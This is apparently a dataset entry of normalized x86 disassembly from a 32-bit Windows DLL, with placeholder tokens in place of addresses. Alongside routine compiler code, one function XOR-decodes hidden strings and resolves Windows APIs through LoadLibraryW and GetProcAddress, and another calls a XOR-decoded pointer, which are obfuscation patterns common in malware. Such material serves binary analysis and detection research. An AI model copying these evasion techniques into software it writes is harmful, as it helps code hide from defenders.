cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
pop ebp
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_1001c3a0
push ebp
mov ebp esp
push 0xffffffff
push sub_10082ae1
mov eax [ fs : 0x0 ]
push eax
sub esp 0xcc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push r--data
mov ebx ecx
lea ecx [ ebp - 0xd4 ]
push edi
push ecx
mov esi edx
mov [ ebp - 0xd8 ] eax
call sub_1002cd10
mov edx esi
push eax
lea esi [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x0
call sub_10030dc0
push eax
mov edx r--data
lea esi [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x1
call sub_10030dc0
push eax
mov edx ebx
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x2
call sub_10030dc0
push eax
mov edx r--data
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x3
call sub_10030dc0
mov edx [ ebp - 0xd8 ]
push eax
lea esi [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x4
call sub_10030dc0
push eax
mov edx r--data
lea esi [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x5
call sub_10030dc0
add esp 0x24
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x6
call sub_10036380
mov esi 0x8
cmp [ ebp - 0x50 ] esi
jb r-xdata
xor ebx ebx
xor eax eax
mov [ ebp - 0x50 ] 0x7
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x64 ] ax
cmp [ ebp - 0x88 ] esi
jb r-xdata
mov edx [ ebp - 0x64 ]
push edx
call sub_1006591f
add esp 0x4
xor edx edx
mov [ ebp - 0x88 ] 0x7
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] dx
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov ecx [ ebp - 0x9c ]
push ecx
call sub_1006591f
add esp 0x4
xor ecx ecx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] cx
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_1006591f
add esp 0x4
xor eax eax
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] ax
cmp [ ebp - 0x6c ] esi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_1006591f
add esp 0x4
xor edx edx
mov [ ebp - 0x6c ] 0x7
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] dx
cmp [ ebp - 0xa4 ] esi
jb r-xdata
mov ecx [ ebp - 0x80 ]
push ecx
call sub_1006591f
add esp 0x4
xor ecx ecx
mov [ ebp - 0xa4 ] 0x7
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xb8 ] cx
cmp [ ebp - 0xc0 ] esi
jb r-xdata
mov eax [ ebp - 0xb8 ]
push eax
call sub_1006591f
add esp 0x4
inc [ edi + 0x1c ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0xd4 ]
push edx
call sub_1006591f
add esp 0x4
sub_1001c590
push ebp
mov ebp esp
sub esp 0xb0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
call [ GetCurrentThreadId@IAT ]
cmp [ esi + 0x374 ] eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb0 ]
mov eax 0x90
call sub_10013830
xor eax eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push 0x1503
push sub_100399c0
push sub_1005f610
push sub_1004ac30
push 0x0
push edi
push r--data
push eax
mov eax [ esi + 0x38c ]
mov [ esi + 0x40 ] 0x1
call eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
add esp 0x20
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1001c61b
push 0x28
mov eax sub_1007f2ec
call sub_100097c8
mov ebx [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp ebx edi
je r-xdata
push 0x5
pop eax
call sub_1004db01
retn
cmp [ ebx ] edi
jne r-xdata
push 0x14
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] edi
cmp esi edi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
cmp ecx edi
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
mov [ esi + 0x4 ] edi
mov [ esi ] r--data
push eax
mov ecx esi
mov [ ebp - 0x10 ] 0x1
mov [ esi + 0x8 ] edi
call sub_1002141a
jmp r-xdata
sub_1001c6b0
push ebp
mov ebp esp
sub esp 0xe4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xe4 ] ebx
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0xe0 ] ebx
mov ebx [ ebp + 0x20 ]
push ebx
mov ebx [ ebp + 0x1c ]
push ebx
mov ebx [ ebp - 0xe0 ]
push ebx
mov ebx [ ebp - 0xe4 ]
push ebx
push edi
push ecx
push eax
mov eax [ ebp + 0x8 ]
push eax
push esi
call sub_10057560
xor edi edi
mov [ esi ] r--data
mov [ esi + 0xb8 ] edi
mov [ esi + 0xbc ] edi
mov [ esi + 0xc0 ] edi
mov [ esi + 0xec ] 0x0
mov ecx [ r--data ]
xor eax eax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffd0
and edx 0xff
mov [ ebp + eax * 2 - 0x48 ] dx
inc eax
cmp eax 0xb
jb r-xdata
lea ecx [ ebp - 0x48 ]
xor eax eax
push ecx
mov [ ebp - 0x32 ] ax
call [ LoadLibraryW@IAT ]
mov [ esi + 0xc0 ] eax
cmp eax edi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov eax esi
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn 0x1c
mov edi [ r--data ]
xor dl dl
xor ecx ecx
mov bl [ ecx + edi ]
xor bl dl
xor bl 0x98
inc dl
mov [ ebp + ecx - 0x10 ] bl
movzx ecx dl
cmp ecx 0xb
jb r-xdata
mov ebx [ GetProcAddress@IAT ]
lea edx [ ebp - 0x10 ]
push edx
push eax
mov [ ebp - 0x5 ] 0x0
call ebx
mov [ esi + 0xc4 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x5c ]
mov eax 0x1a
call sub_10040db0
mov ecx [ esi + 0xc0 ]
mov eax edi
push eax
push ecx
call ebx
mov [ esi + 0xc8 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0xc4 ]
mov eax 0x59
call sub_10040db0
mov eax [ esi + 0xc0 ]
mov edx edi
push edx
push eax
call ebx
mov [ esi + 0xcc ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x20 ]
mov eax 0x33
call sub_10040db0
mov edx [ esi + 0xc0 ]
mov ecx edi
push ecx
push edx
call ebx
mov [ esi + 0xd0 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x70 ]
mov eax 0x17
call sub_10040db0
mov ecx [ esi + 0xc0 ]
mov eax edi
push eax
push ecx
call ebx
mov [ esi + 0xd4 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0xac ]
mov eax 0x68
call sub_10040db0
mov eax [ esi + 0xc0 ]
mov edx edi
push edx
push eax
call ebx
mov [ esi + 0xd8 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x30 ]
mov eax 0x31
call sub_10040db0
mov edx [ esi + 0xc0 ]
mov ecx edi
push ecx
push edx
call ebx
mov [ esi + 0xdc ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x98 ]
mov eax 0x5b
call sub_10040db0
mov ecx [ esi + 0xc0 ]
mov eax edi
push eax
push ecx
call ebx
mov [ esi + 0xe0 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x84 ]
mov eax 0x60
call sub_10040db0
mov eax [ esi + 0xc0 ]
mov edx edi
push edx
push eax
call ebx
mov [ esi + 0xe4 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0xdc ]
xor eax eax
call sub_10040db0
mov edx [ esi + 0xc0 ]
mov ecx edi
push ecx
push edx
call ebx
mov [ esi + 0xe8 ] eax
test eax eax
je r-xdata
mov [ esi + 0xec ] 0x1
sub_1001c920
push 0x5c
mov eax sub_1007fdba
call sub_1001bb6b
fldz
mov eax [ ebp + 0x8 ]
fld [ ebp + 0x20 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp + 0x18 ]
fcom st1
mov [ ebp - 0x68 ] eax
xor ebx ebx
mov edi ecx
mov [ ebp - 0x64 ] bl
fnstsw ax
fstp st1
test ah 0x5
jpe r-xdata
fld [ r--data ]
mov [ ebp - 0x58 ] ebx
fcom st1
fnstsw ax
test ah 0x41
jpo r-xdata
mov [ ebp - 0x64 ] 0x1
fchs
cmp [ ebp - 0x58 ] 0x1388
jae r-xdata
fstp st0
jmp r-xdata
fxch st1
add [ ebp - 0x58 ] 0xa
fdiv [ r--data ]
fcom st1
fnstsw ax
test ah 0x1
je r-xdata
xor eax eax
mov [ ebp - 0x40 ] 0x7
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] ax
push ecx
push ecx
fstp [ esp ]
push r--data
lea eax [ ebp - 0x38 ]
push 0x28
push eax
mov [ ebp - 0x4 ] ebx
call sub_10010183
add esp 0x14
xor esi esi
mov [ ebp - 0x5c ] eax
cmp eax ebx
jle r-xdata
fxch st1
fstp st1
lea eax [ edi + 0x8 ]
push eax
push ebx
push 0x30
call sub_1003088d
movzx eax ax
add esp 0xc
push eax
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x54 ]
call sub_100550c4
sub esp 0x1c
lea eax [ ebp - 0x54 ]
mov ecx esp
mov [ ebp - 0x5c ] esp
push eax
call sub_100154d5
push [ ebp - 0x64 ]
mov ecx edi
push [ ebp + 0x1c ]
push [ ebp - 0x68 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x60 ]
call sub_1004071e
push ebx
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_1000aecf
mov eax [ ebp - 0x60 ]
call sub_1004fa89
retn 0x20
lea eax [ edi + 0x8 ]
push eax
movzx eax [ ebp + esi - 0x38 ]
push ebx
push eax
call sub_1003088d
movzx eax ax
add esp 0xc
push eax
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_100550c4
inc esi
cmp esi [ ebp - 0x5c ]
jl r-xdata
sub_1001ca49
push 0x28
mov eax sub_1007f2ec
call sub_100097c8
mov ebx [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp ebx edi
je r-xdata
push 0x5
pop eax
call sub_1004db01
retn
cmp [ ebx ] edi
jne r-xdata
push 0x14
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] edi
cmp esi edi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
cmp ecx edi
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
mov [ esi + 0x4 ] edi
mov [ esi ] r--data
push eax
mov ecx esi
mov [ ebp - 0x10 ] 0x1
mov [ esi + 0x8 ] edi
call sub_1002141a
jmp r-xdata
sub_1001cae0
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x14 ] eax
mov al 0x38
xor [ ebp - 0x14 ] al
xor [ ebp - 0x13 ] al
xor [ ebp - 0x12 ] al
xor [ ebp - 0x11 ] al
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] 0x6
call [ ebp - 0x14 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1001cb30
push ebp
mov ebp esp
push ecx
test esi esi
je r-xdata
mov eax 0x1
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push edi
lea edx [ ebp - 0x4 ]
mov eax 0x1e
call sub_10013830
movzx ecx [ esi ]
or edi 0xffffffff
xor eax eax
test cx cx
je r-xdata
push esi
mov edx 0x7ffffffe
mov eax 0x104
mov ecx ebx
call sub_1006c8f0
test eax eax
jns r-xdata
mov edx [ ebp - 0x4 ]
mov eax 0x50
mov eax 0x4
pop edi
mov esp ebp
pop ebp
retn
movzx ecx [ esi + eax * 2 + 0x2 ]
inc eax
test cx cx
jne r-xdata
mov edi eax
cmp cx dx
jne r-xdata
cmp edi 0xffffffff
je r-xdata
test edi edi
jne r-xdata
cmp edi 0x7ffffffe
jbe r-xdata
lea eax [ edi + 0x2 ]
pop edi
mov esp ebp
pop ebp
retn
push esi
mov edx edi
mov eax 0x104
mov ecx ebx
call sub_1006c8f0
test eax eax
jns r-xdata
xor eax eax
mov [ ebx ] ax
mov eax 0x3
pop edi
mov esp ebp
pop ebp
retn
lea ecx [ esi + edi * 2 + 0x2 ]
push ecx
call [ StrToIntW@IAT ]
movzx eax ax
test ax ax
jne r-xdata
mov eax 0x3
pop edi
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx ] ax
xor eax eax
pop edi
mov esp ebp
pop ebp
retn
sub_1001cc15
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x50
push 0x1
call sub_1000977c
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x18 ] edi
jne r-xdata
mov esi [ esi + 0xbc ]
push 0x14
pop ecx
mov edi ebx
push 0x4
[ edi ] [ esi ]
call sub_10008102
xor edi edi
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rw-data
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov [ eax ] edi
cmp [ esi + 0x1c ] edi
je r-xdata
push ebx
call sub_10022b5a
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xb4 ]
mov edi [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ ebx ] eax
mov eax [ rw-data ]
mov [ ebx + 0x4 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x8 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x30 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] edi
mov [ ebx + 0x34 ] eax
push 0x4
call sub_10008102
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
test eax eax
je r-xdata
push eax
call edi
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x3e ]
push ebx
push 0xe
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_100203c5
mov edi eax
lea eax [ ebx + 0x4 ]
push eax
push 0xf
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ ebx + 0x8 ]
push eax
push 0x10
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ ebx + 0x30 ]
push eax
push 0xe
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_100203c5
add esp 0x50
or edi eax
lea eax [ ebx + 0x34 ]
push eax
push 0xf
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_100203c5
add esp 0x14
or eax edi
je r-xdata
xor esi esi
inc esi
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb4 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call edi
test eax eax
jne r-xdata
mov eax [ ebx + 0x8 ]
jmp r-xdata
push ebx
call sub_1003c5db
pop ecx
or esi 0xffffffff
jmp r-xdata
push [ esi + 0xb0 ]
call sub_10022b5a
push [ esi + 0xbc ]
call sub_10022b5a
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
push ebx
call sub_10022b5a
push [ ebp - 0x8 ]
call sub_10022b5a
pop ecx
pop ecx
mov eax esi
jmp r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ecx ] eax
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
mov cl [ esi + 0x1 ]
mov [ esi ] cl
inc esi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_1001ce05
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
cmp eax edi
jae r-xdata
mov ebx [ ebp + 0xc ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
push r--data
call sub_10050437
test ebx ebx
je r-xdata
push r--data
call sub_1002c5ed
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
add eax ebx
push 0x0
push eax
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_10003d30
test al al
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x8
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov edx [ esi + 0x10 ]
sub edx edi
add edx edx
push edx
lea ecx [ ecx + edi * 2 ]
push ecx
lea ecx [ edi + ebx ]
lea eax [ eax + ecx * 2 ]
push eax
call sub_10078db0
add esp 0xc
push [ ebp + 0x10 ]
mov ecx esi
push ebx
push edi
call sub_10030910
cmp [ esi + 0x14 ] 0x8
mov eax [ ebp + 0x8 ]
mov [ esi + 0x10 ] eax
jb r-xdata
xor edx edx
mov [ ecx + eax * 2 ] dx
sub_1001ceb1
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
xor esi esi
push edi
mov edi [ rw-data ]
mov [ ebp - 0x4 ] esi
mov eax [ edi ]
cmp eax esi
je r-xdata
xor eax eax
mov ebx [ WideCharToMultiByte@IAT ]
or eax 0xffffffff
jmp r-xdata
push 0x1
push eax
call sub_1000977c
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push esi
push esi
push [ ebp - 0x8 ]
push eax
push 0xffffffff
push [ edi ]
push esi
push esi
call ebx
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_10022b5a
pop ecx
jmp r-xdata
lea eax [ ebp - 0x4 ]
push esi
push eax
call sub_10042ad3
pop ecx
pop ecx
test eax eax
jns r-xdata
add edi 0x4
mov eax [ edi ]
cmp eax esi
jne r-xdata
cmp [ ebp - 0x4 ] esi
je r-xdata
push esi
push esi
push esi
push esi
push 0xffffffff
push eax
push esi
push esi
call ebx
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
push [ ebp - 0x4 ]
call sub_10022b5a
pop ecx
mov [ ebp - 0x4 ] esi
sub_1001cf50
push ebp
mov ebp esp
sub esp 0x234
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x22c ] eax
mov eax [ ebp + 0x8 ]
push eax
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x230 ] edx
call sub_10039dc0
add esp 0x4
test eax eax
je r-xdata
push ebx
push esi
push edi
lea edx [ ebp - 0x224 ]
xor eax eax
call sub_100052b0
mov edi [ rw-data ]
cmp [ edi + 0x120 ] 0x0
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
pop edi
pop esi
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push 0x208
lea ecx [ ebp - 0x21c ]
push 0x0
push ecx
call sub_10079a10
lea edx [ ebp - 0x220 ]
push edx
call sub_1003b1ca
mov ecx [ ebp - 0x220 ]
mov eax 0xcccccccd
mul ecx
mov eax [ edi + 0x120 ]
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov [ ebp - 0x220 ] ecx
imul ecx ecx 0x208
lea ebx [ ecx + eax + 0x1082c ]
add esp 0x10
mov ecx 0x104
lea eax [ ebp - 0x21c ]
xor esi esi
jmp r-xdata
cmp [ eax ] si
je r-xdata
test ecx ecx
jne r-xdata
add eax 0x2
dec ecx
jne r-xdata
mov edx 0x104
sub edx ecx
jmp r-xdata
mov esi 0x80070057
xor edx edx
jmp r-xdata
mov eax esi
test esi esi
js r-xdata
test eax eax
jne r-xdata
mov eax 0x104
sub eax edx
lea ecx [ ebp + edx * 2 - 0x21c ]
push ebx
mov edx 0x7fffffff
call sub_1006c8f0
lea eax [ ebp - 0x224 ]
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
je r-xdata
lea edx [ ebp - 0x220 ]
push edx
call sub_1003b1ca
mov ecx [ ebp - 0x220 ]
mov eax 0xcccccccd
mul ecx
mov eax [ edi + 0x120 ]
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov [ ebp - 0x220 ] ecx
imul ecx ecx 0x208
add esp 0x4
lea ecx [ ecx + eax + 0x11c7c ]
push ecx
mov esi 0x104
lea ebx [ ebp - 0x21c ]
call sub_1003d910
test eax eax
je r-xdata
lea ecx [ ebp - 0x224 ]
push ecx
mov esi 0x104
lea ebx [ ebp - 0x21c ]
call sub_1003d910
test eax eax
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax 0x2
call sub_100052b0
mov eax [ ebp - 0x22c ]
push edx
mov edx [ ebp - 0x228 ]
push eax
lea ecx [ ebp - 0x21c ]
push ecx
mov ecx [ ebp - 0x230 ]
push edx
mov edx [ ebp + 0x8 ]
call sub_10018450
mov ecx [ ebp - 0x4 ]
add esp 0x10
neg eax
pop edi
sbb eax eax
pop esi
xor ecx ebp
and eax 0x4
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1001d15c
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0x8 ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1000df21
add esp 0x10
test eax eax
jns r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x18 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_1001d1a0
push ebp
mov ebp esp
push 0xffffffff
push sub_10081fbb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esi + 0xc8 ]
sub eax [ esi + 0xc4 ]
add esi 0xc4
sar eax 0x2
xor ecx ecx
mov edi edx
test eax eax
je r-xdata
push 0x98
call sub_10055606
add esp 0x4
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov edx [ esi ]
mov ebx [ edi + 0x20 ]
mov [ ebp - 0x50 ] edx
xor edi edi
mov edx edi
mov edi eax
call sub_10054170
mov edi eax
jmp r-xdata
mov eax [ esi ]
mov esi [ eax + ecx * 4 ]
mov eax [ edi + 0x28 ]
add eax [ esi + 0x40 ]
mov [ ebp - 0x50 ] ecx
cmp [ eax ] 0x0
jne r-xdata
mov edx [ ebp - 0x50 ]
inc ecx
add edx 0x4
mov [ ebp - 0x50 ] edx
cmp ecx eax
jb r-xdata
inc eax
cmp eax 0x1c
jb r-xdata
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x50 ]
cmp ecx eax
jae r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x50 ] edi
xor eax eax
mov edi edi
mov eax ecx
jmp r-xdata
mov ecx [ edi + 0x24 ]
add [ esi + 0x44 ] ecx
mov edx [ edi + 0x24 ]
mov ecx [ edi + 0x34 ]
push edx
push ecx
push eax
call sub_100796a0
add esp 0xc
lea ebx [ esi + 0x50 ]
mov ecx edi
call sub_10044860
mov edx [ esi + 0x48 ]
cmp [ esi + 0x44 ] edx
jne r-xdata
mov edx [ edx ]
cmp [ edx + 0x4 ] ebx
je r-xdata
mov ecx [ esi + 0x8 ]
cmp eax ecx
jne r-xdata
mov edx [ esi ]
cmp edx ecx
ja r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x50 ]
mov ecx [ esi + 0x40 ]
call sub_1004a310
mov [ esi + 0x4c ] eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx [ esi ]
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
mov edi ecx
mov ecx [ esi + 0x8 ]
sub edi edx
sar edi 0x2
cmp eax ecx
jne r-xdata
add [ esi + 0x4 ] 0x4
mov eax [ esi + 0x4 ]
sub eax [ esi ]
sar eax 0x2
dec eax
mov [ eax ] edi
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call sub_1002c5ed
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
mov edx ecx
shr edx 0x1
mov ebx 0x3fffffff
sub ebx edx
cmp ebx ecx
jae r-xdata
mov edx [ esi ]
mov ecx [ edx + edi * 4 ]
mov [ eax ] ecx
jmp r-xdata
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call sub_1002c5ed
add ecx edx
xor ecx ecx
jmp r-xdata
mov edx ecx
shr edx 0x1
mov ebx 0x3fffffff
sub ebx edx
cmp ebx ecx
jae r-xdata
push ecx
call sub_1000a510
mov ecx eax
cmp ecx eax
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push ecx
call sub_1000a510
mov ecx eax
cmp ecx eax
jae r-xdata
sub_1001d390
push ebp
mov ebp esp
sub esp 0x58
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
xor eax eax
inc eax
cmp eax 0x28
jb r-xdata
mov eax [ esi + 0x20 ]
push eax
call [ ReleaseMutex@IAT ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x6a
call sub_100050e0
mov ecx [ esi + 0x20 ]
push ecx
call [ CloseHandle@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov [ esi + 0x20 ] 0x0
xor eax eax
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x40 ]
mov eax 0x71
call sub_100050e0
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1001d404
push 0x14
push r--data
call sub_10079bf0
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x18 ]
cmp esi edi
setne al
cmp eax edi
jne r-xdata
or [ esi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] edi
setne al
cmp eax edi
je r-xdata
call sub_1004fd6f
push 0x16
pop esi
mov [ eax ] esi
call sub_1001d849
mov eax esi
jmp r-xdata
cmp [ ebp + 0x1c ] edi
je r-xdata
call sub_10079c35
retn
mov [ ebp - 0x4 ] edi
push [ ebp + 0x14 ]
